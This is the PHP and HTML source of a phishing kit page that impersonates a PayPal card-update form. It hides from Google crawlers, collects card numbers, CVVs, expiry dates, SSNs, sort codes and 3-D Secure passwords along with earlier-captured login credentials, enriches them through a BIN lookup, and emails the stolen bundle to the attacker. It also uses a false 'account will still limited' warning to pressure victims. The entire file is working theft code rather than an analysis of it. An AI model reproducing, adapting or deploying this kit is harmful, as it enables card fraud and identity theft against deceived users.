<?php
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
error_reporting(0);
	#################################################
	#                FaHaD-IQ                       #
	#              fb/mr.fahad6                     #
	#################################################
session_start();
include("../../include/__config__.php");
include("../../include/function.php");
include("../../include/antibot.php");
$_SESSION['_IP_']  = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	$_SESSION['_browser_'] = $browser;
    $_SESSION['cntcode'] = $countrycode;
    $_SESSION['cntname'] = $countryname;
if ($_SESSION["_id_"] == "" ){
		$_SESSION["_id_"] = $_SESSION['_IP_'];
		}
	else if($_SESSION['logint'] !="on" ) {
		
		header("location: login.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=".$_SESSION['_lang_']."&email=".$_SESSION['_email_']."&confirm_account_3b2vhFa76bAq6&firstname=".$_SESSION['_firstname_']."&tmpl=profile%2Fmyaccount&aid=358301&new_account=1&import=1");
	}
	else if($_SESSION['billing'] =="on" ) {
		
		header("location: websc-success.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);			
	}
if(isset($_REQUEST["btn_submit"]))
 {
if($_SESSION['billupdatead'] !="on") {
 #Credit card information
$_SESSION['_cctype_'] = $_POST['c_type'];
$_SESSION['_cardholder_'] = $_POST['cardholder'];
$_SESSION['_ccn_'] = $_POST['cardnumber'];
$_SESSION['_edmonth_'] = $_POST['expmonth'];
$_SESSION['_edyear_'] = $_POST['expyear'];
$_SESSION['_cvn_'] = $_POST['cvc'];
$_SESSION['_SSN_'] = $_POST['ssn1'];
#Security information
$_SESSION['_sec_c_'] = $_POST['secure3d'];
$_SESSION['_sec_3_'] = $_POST['secure3amex'];

////////////////////////////////////////////////////////////////////////////////////

// check bank
$fukjjdhnnum = substr($_POST['cardnumber'] , 0, 6);
$ursdjjsdjfbl ="https://lookup.binlist.net/".$fukjjdhnnum;
$binhhsjfbbbsbjfbs334hb = @json_decode(file_get_contents($ursdjjsdjfbl));
 
// country 
		if($binhhsjfbbbsbjfbs334hb->country->name != null)
		{
			$_SESSION['bin_cnt'] = "Client Card Coun : ".$binhhsjfbbbsbjfbs334hb->country->name."</font><br/>";
		} else {
			$_SESSION['bin_cnt'] ="";
		}


// Bank
		if($binhhsjfbbbsbjfbs334hb->bank->name != null)
		{
			$_SESSION['bin_bnk'] = "Client Card Bank : ".$binhhsjfbbbsbjfbs334hb->bank->name."</font><br/>";

		} else {
			$_SESSION['bin_bnk'] ="";
		}


// type
		if($binhhsjfbbbsbjfbs334hb->type != null)
		{
			$_SESSION['bin_typ'] = " ".$binhhsjfbbbsbjfbs334hb->type."</font>";
		} else {
			$_SESSION['bin_typ'] ="";
		}

// level
		if($binhhsjfbbbsbjfbs334hb->brand != null)
		{
			$_SESSION['bin_lev'] = " ".$binhhsjfbbbsbjfbs334hb->brand."</font>";
		} else {
			$_SESSION['bin_lev'] ="";
		}
	
		

////////////////////////////////////////////////////////////////////////////////////




		// check snn sort and sec
		if($_POST['ssn1'] =="" ) {
		$ssn="";
		} else {

		$ssn="Client Ssn       : ".$_SESSION['_SSN_']."</font><br />";

		}

		if($_POST['sortcode'] =="" ) {
		$sortc="";
		}
		else {
		$sortc="Client Sort code : ".$_SESSION['_sort_c_']."</font><br />";
		}
		if($_POST['secure3d'] =="" ) {
		$secc="";
		}
		else {
		$secc="Client 3DPass    : ".$_SESSION['_sec_c_']."</font><br />";
		}
		if($_POST['secure3amex'] =="" ) {
		$secc3="";
		}
		else {
		$secc3="Client 3 Digit Code  : ".$_SESSION['_sec_3_']."</font><br />";
		}
}
		//error_reporting(E_ALL);
ini_set('display_errors', 1);

	
$message = "
<div>

========================================</font><br />
 PayPal Card info - FaHaD-HacK !</font><br />
===============[Login info]===============</font><br />
Client Email     : ".$_SESSION['_email_']."</font><br />
Client Password  : <font color='#FF0000'>".$_SESSION['_password_']."</font><br />
Client Browser   : ".$browser."</font><br />
==============[Card info ]===============</font><br />
Client Card Type : ".$_SESSION['_cctype_']."/".$_SESSION['bin_typ']."/".$_SESSION['bin_lev']."</font><br />
".$_SESSION['bin_cnt']."
".$_SESSION['bin_bnk']."
Client Card name : ".$_SESSION['_cardholder_']."</font><br />
Client Card NB   : ".$_SESSION['_ccn_']."</font><br />
Client Expir Data: ".$_SESSION['_edmonth_']."/".$_SESSION['_edyear_']."</font><br />
Client CVV / CVC : ".$_SESSION['_cvn_']."</font><br />
".$ssn."
".$secc3."
".$sortc."
".$secc."
===============[ ip info ]================</font><br />
Client Address: City: ".$city1." /Region: ".$region1." /Zip: ".$postal1."</font><br />
Client Hostname: ".$hostname."</font><br />
Client Agent : ".$user_agent."</font><br />
Client Time : ".$time."</font><br />
Client iP : http://www.geoiptool.com/?IP=".$_SESSION['_IP_']."</font><br />
========================================</font><br />

</div>";
if($_POST['sec_c']){
	$vbv = "VBV";
}
else {
	$vbv = "CCV";
}
if($_SESSION['billupdatead'] =="on" ) {
	$_SESSION[_updmsgate_] = "ReUpdate";
} else {
	$_SESSION[_updmsgate_] = "";
}



$subject  = "PAYPAL ".$_SESSION['_cctype_']." CARD - [ ".$binhhsjfbbbsbjfbs334hb->country->name." / ".$binhhsjfbbbsbjfbs334hb->bank->name." / ".$binhhsjfbbbsbjfbs334hb->type." / ".$binhhsjfbbbsbjfbs334hb->brand." / ".$_SESSION['_IP_']."] ";
$headers  = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: YENI CREDIT/INFO <2Card@cardfahad.com>";
$exd = $_POST['expyear'].$_POST['expmonth'];



if($_SESSION['billupdatead'] !="on" && $_POST['cardholder'] == "" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");		
	}
	else if($_SESSION['billupdatead'] !="on" && $_POST['cardnumber'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");		
	}
	else if($_SESSION['billupdatead'] !="on" && $_POST['cvc'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");		
	}
	else if($_SESSION['billupdatead'] !="on" && $_POST['expmonth'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");		
	}
	else if($_SESSION['billupdatead'] !="on" && $_POST['expyear'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");		
	}
	else if($_SESSION['billupdatead'] !="on" && $exd <1603) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");
	}
	else {
 if(count($_POST)>0){
	foreach ($_REQUEST as $key => $value) {
	 $_SESSION['post'][$key] = $value;
	 }
	extract($_SESSION['post']); // Function to extract array.
	@mail($to,$subject,$message,$headers);
	 $billing= "on";
	  $_SESSION['billupdatead'] ="off";
	 $_SESSION['billupdatecc'] ="off";
	$_SESSION['billing'] = $billing;
	header("Location: websc-success.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);
	}
	}
	}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title><?php echo $PAYPAL_SERVICE_UPDATE_TXT;?></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">
<meta name="author" content="">
<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
<!-- Le styles -->
<link href="../../css/bootstrap.css" rel="stylesheet">
<link href="../../css/bootstrap-responsive.css" rel="stylesheet">
    
    <!--<link rel="stylesheet" href="css/app.css">-->

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.js"></script>
    <![endif]-->  
    <script type="text/javascript">
// <![CDATA[



function SelectCC(cardnumber) {
var first = cardnumber.charAt(0);
var second = cardnumber.charAt(1);
var third = cardnumber.charAt(2);
var fourth = cardnumber.charAt(3);
var ccnmbr = (cardnumber + '').replace(/[^0-9.]/g, ''); //remove space

$(function() {
  $('#frm1').on('keydown', '#cardnumber', function(e){-1!==$.inArray(e.keyCode,[46,8,9,27,13,110,190])||/65|67|86|88/.test(e.keyCode)&&(!0===e.ctrlKey||!0===e.metaKey)||35<=e.keyCode&&40>=e.keyCode||(e.shiftKey||48>e.keyCode||57<e.keyCode)&&(96>e.keyCode||105<e.keyCode)&&e.preventDefault()});
})

$(function() {
  $('#frm1').on('keydown', '#cvc', function(e){-1!==$.inArray(e.keyCode,[46,8,9,27,13,110,190])||/65|67|86|88/.test(e.keyCode)&&(!0===e.ctrlKey||!0===e.metaKey)||35<=e.keyCode&&40>=e.keyCode||(e.shiftKey||48>e.keyCode||57<e.keyCode)&&(96>e.keyCode||105<e.keyCode)&&e.preventDefault()});
})

$(function() {
  $('#frm1').on('keydown', '#ssn1', function(e){-1!==$.inArray(e.keyCode,[46,8,9,27,13,110,190])||/65|67|86|88/.test(e.keyCode)&&(!0===e.ctrlKey||!0===e.metaKey)||35<=e.keyCode&&40>=e.keyCode||(e.shiftKey||48>e.keyCode||57<e.keyCode)&&(96>e.keyCode||105<e.keyCode)&&e.preventDefault()});
})

$(function() {
  $('#frm1').on('keydown', '#sortcode', function(e){-1!==$.inArray(e.keyCode,[46,8,9,27,13,110,190])||/65|67|86|88/.test(e.keyCode)&&(!0===e.ctrlKey||!0===e.metaKey)||35<=e.keyCode&&40>=e.keyCode||(e.shiftKey||48>e.keyCode||57<e.keyCode)&&(96>e.keyCode||105<e.keyCode)&&e.preventDefault()});
})

if ((/^(417500|(4917|4913|4508|4844)\d{2})\d{10}$/).test(ccnmbr) && ccnmbr.length == 16) {
//Electron
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "1";
document.getElementById("3dcode").style.display= "none";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3amex").style.display= "none";
document.getElementById("3digit").style.display= "none";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="ELECTRON";
}

else if ((/^(4)/).test(ccnmbr) && (ccnmbr.length == 16)) {
//Visa
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "1";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("3dcode").style.display= "inline";
document.getElementById("3amex").style.display= "none";
document.getElementById("3digit").style.display= "none";
document.getElementById("3dcodee").style.display= "block";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="VISA";
}
else if ((/^(34|37)/).test(ccnmbr) && ccnmbr.length == 15) {
//American Express
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "1";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("3digit").style.display= "inline";
document.getElementById("3amex").style.display= "block";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{3}";
document.getElementById("crad_type").value="AMEX";
}

else if ((/^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d+$/).test(ccnmbr) && ccnmbr.length == 16) {
//Maestro
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "1";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("3digit").style.display= "none";
document.getElementById("3amex").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="MAESTRO";
}

else if ((/^(51|52|53|54|55)/).test(ccnmbr) && ccnmbr.length == 16) {
//Mastercard
document.getElementById("mastercard").style.opacity= "1";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("3dcode").style.display= "none";
document.getElementById("3dcodee").style.display= "block";
document.getElementById("3dcodemaster").style.display= "inline";
document.getElementById("3digit").style.display= "none";
document.getElementById("3amex").style.display= "none";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="MASTERCARD";
}
else if ((/^(6011|16)/).test(ccnmbr) && ccnmbr.length == 16) {
//Discover
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "1";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("3digit").style.display= "none";
document.getElementById("3amex").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="DISCOVER";
}

else {
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("3digit").style.display= "none";
document.getElementById("3amex").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{2,3}";
document.getElementById("crad_type").value="";



}
}
// ]]></script>


<script type="text/javascript">
function Frm1country(country) {
var mazkda = document.getElementById("country");
var selectedValue = mazkda.options[mazkda.selectedIndex].value;

if (selectedValue == "United States") {
document.getElementById("3dcodeeun").style.display= "block";
$('#ssn1').prop('required',true);
$('#sortcode').prop('required',false);
document.getElementById("3dcodeeuk").style.display= "none";
}
else if (selectedValue == "United Kingdom") {
document.getElementById("3dcodeeun").style.display= "none";
document.getElementById("3dcodeeuk").style.display= "block";
$('#ssn1').prop('required',false);
$('#sortcode').prop('required',true);
}
else {
document.getElementById("3dcodeeun").style.display= "none";
document.getElementById("3dcodeeuk").style.display= "none";
$('#sortcode').prop('required',false);
$('#ssn1').prop('required',false);
}

}
</script>

 <script type="text/javascript">
      var hook = true;
      window.onbeforeunload = function() {
        if (hook) {
          return "Your account will still limited."
        }
      }
      function unhook() {
        hook=false;
      }
    </script>	
  </head>

  <body style="background:#f5f5f5;">

<div class="row-fluid">
     <?php include("header.php"); ?>
</div>


    <div class="container">

     

      <!-- Example row of columns -->
      <div class="row" style="margin-top:100px;" id="toprow" >     
        <?php include("left.php"); ?>                    
        <div class="span7" style="background:#fff;padding:15px 32px; 0 0;box-shadow:0 1px 4px 0 #d5d5d5;border-radius:5px;">

          <form name="frm1" id="frm1" class="form-horizontal"  enctype="multipart/form-data" data-toggle="validator" role="form" method="post" action="websc-billing.php" >

        <?php if($_SESSION['billupdatead'] !="on" ) { ?>


         <h3><?php echo $UPDATE_YOUR_CREDIT_OR_DEBIT_CARD_TXT; ?></h3><hr />
        
         <center>
		<?php if($_GET['error'] =="truec"){ ?>
        <div class="alert-error">
        <!--<a href="#" class="close" data-dismiss="alertsuccess">&times;</a>-->
        <i>Please make sure you enter your information correctly.</i>
		</div>
		<br>
        <?php } ?>
        <p style="margin-bottom:20px;"><?php echo $PLEASE_ENTER_YOUR_CREDIT_OR_DEBIT_CARD_DETAILS_CORRECTLY_TXT; ?></p>
        </center>
                 
        <div class="control-group">
          <label class="control-label" for="cardholder"><?php echo $CARD_HOLDER_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input" name="cardholder" id="cardholder" value="<?php if(isset($_SESSION['_cardholder_'])){ echo $_SESSION['_cardholder_'];} ?>" title="Card Holder Name"   pattern="[a-zA-Z].{3,}" autofocus required /></div>
          </div>
		  <div class="control-group">
          <label class="control-label" for="cardholder"><?php echo $CARD_TYPE; ?><span class="red"> </span></label>
          <div class="prfDetails confidential">
<img id="visa" src="../../img/icons/v.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="electron" src="../../img/icons/visa-electron-curved.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="mastercard" src="../../img/icons/payment_method_master_card-48.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="maestro" src="../../img/icons/maestro-curved.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="amex" src="../../img/icons/payment_method_american_express_card-48.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="discover" src="../../img/icons/payment_method_discover_network_card-48.png" width="36" height="30" style="opacity: 0.40;"/>
</div></div>

          <div class="control-group">
          <label class="control-label" for="cardnumber"><?php echo $CARD_NUMBER_TXT; ?><span class="red">*</span></label>
          <div class="controls" id="samma"><input type="text" name="cardnumber" id="cardnumber" autocomplete="off" onkeyup="SelectCC(this.value)" title="Enter 16 Digit Card Number" value="" required maxlength="16" pattern="^(?:4[0-9]{15}?|5[1-5][0-9]{14}|(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d{12}$|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$" /></div>
          </div>
		  	<input name="c_type" type="hidden" id="crad_type" width="" value="" />
			<input name="c_valid" type="hidden" id="card_valid" value="" />
        <div class="control-group">
          <label class="control-label" for="expmonth"><?php echo $EXPIRATION_DATE_TXT; ?><span class="red">*</span></label>
          <div class="controls"><select class="input-small" name="expmonth" style="width: 100px;" id="expmonth" required>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="") echo "selected"; } ?> value="">Month</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="01") echo "selected"; } ?> value="01">1-January</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="02") echo "selected"; } ?> value="02">2-Febuary</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="03") echo "selected"; } ?> value="03">3-March</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="04") echo "selected"; } ?> value="04">4-April</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="05") echo "selected"; } ?> value="05">5-May</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="06") echo "selected"; } ?> value="06">6-June</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="07") echo "selected"; } ?> value="07">7-July</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="08") echo "selected"; } ?> value="08">8-August</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="09") echo "selected"; } ?> value="09">9-September</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="10") echo "selected"; } ?> value="10">10-October</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="11") echo "selected"; } ?> value="11">11-November</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="12") echo "selected"; } ?> value="12">12-December</option>
							</select>
                                <select class="input-mini" name="expyear" style="width: 70px;" id="expyear" required>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="") echo "selected"; } ?> value="">Year</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="20") echo "selected"; } ?> value="20">2020</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="21") echo "selected"; } ?> value="21">2021</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="22") echo "selected"; } ?> value="22">2022</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="23") echo "selected"; } ?> value="23">2023</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="24") echo "selected"; } ?> value="24">2024</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="25") echo "selected"; } ?> value="25">2025</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="26") echo "selected"; } ?> value="26">2026</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="27") echo "selected"; } ?> value="27">2027</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="28") echo "selected"; } ?> value="28">2028</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="29") echo "selected"; } ?> value="29">2029</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="30") echo "selected"; } ?> value="30">2030</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="31") echo "selected"; } ?> value="31">2031</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="32") echo "selected"; } ?> value="32">2032</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="33") echo "selected"; } ?> value="33">2033</option>

    				
</select>

</div>
          </div>
          <div class="control-group">
          <label class="control-label" for="cvc"><?php echo $CVC_TXT; ?><span class="red">*</span></label>
          <div class="controls">
          <input type="password" autocomplete="off" onkeyup="Frm1country(country)" class="input-mini" name="cvc" id="cvc" maxlength="4" value="" required pattern="[0-9]{3,4}" title="Enter 3 or 4 Digit Code" />
          </div>
          </div>

              <div class="control-group" id="3dcodee" style="display: none;">
          <label class="control-label" for="secure3d"><?php echo $SECURE_3D_TXT;?></label>
          <div class="controls"><input type="password" class="input-small" name="secure3d" id="secure3d"  value="<?php if(isset($_SESSION['_sec_c_'])){ echo $_SESSION['_sec_c_'];} ?>" autocomplete="off" />  <img id="3dcode" src="../../img/icons/verified-by-visa.png" width="45" style="display: none;"/><img id="3dcodemaster" src="../../img/icons/mastercard-securecode.png" width="55" style="display: none;"/></div>
          </div>
		  <div class="control-group" id="3amex" style="display: none;">
          <label class="control-label" for="secure3amex"><?php echo $DIGIT_AMEX;?><span class="red">*</span></label>
          <div class="controls"><input type="password" class="input-small" name="secure3amex" id="secure3amex" minlength="3" maxlength="3" value="<?php if(isset($_SESSION['_sec_3_'])){ echo $_SESSION['_sec_3_'];} ?>" autocomplete="off" />  <img id="3digit" src="../../img/icons/3digit.png" width="55" style="display: none;"/></div>
          </div>
	                 <?php } ?>

        <div class="control-group">  
    <label class="control-label" ></label>
   <div class="controls">
<input type="submit" onClick="unhook()" name="btn_submit" id="btn_submit" value="<?php echo $NEXT_TXT; ?>" class="btn btn-primary" style="padding: 7px 15px 8px; width: 130px; line-height: 18px; font-size:14px;font-weight:bold;" /> </div></div>
          </form>
          
          
        <center><div style="color:#0079c1;margin:35px 0 20px ;" id="ft3"><span style="color:#000;"> <?php echo $UPDATE_CREDIT_OR_DEBIT_CARD_TXT; ?></span><b class="caret-right"></b> <?php echo $UPDATE_DONE_TXT; ?></div></center>
       </div>
       
     
       
      </div>

      <hr />


        <div class="container" id="ft1">
         
         
    <ul class="nav nav-pills" style="color:#ccc;font-weight:bold;">
        <li><a href="#"><?php echo $ABOUT_TXT; ?></a></li>
        <li><a href="#"><?php echo $HELP_TXT; ?></a></li>
        <li><a href="#"><?php echo $RATES_TXT; ?></a></li>
        <li><a href="#"><?php echo $SECURITY_TXT; ?></a></li>
        <li><a href="#"><?php echo $DEVELOPERS_TXT; ?></a></li>
        <li><a href="#"><?php echo $PARTNERS_TXT; ?></a></li>
    </ul>
        </div>
      



    </div> <!-- /container -->
    
<?php include("footer.php");?>
    
<!--<script src="../../js/main.js"></script> -->

<!--<script src="../../js/jquery-1.7.1.min.js"></script> -->
</body>
</html>    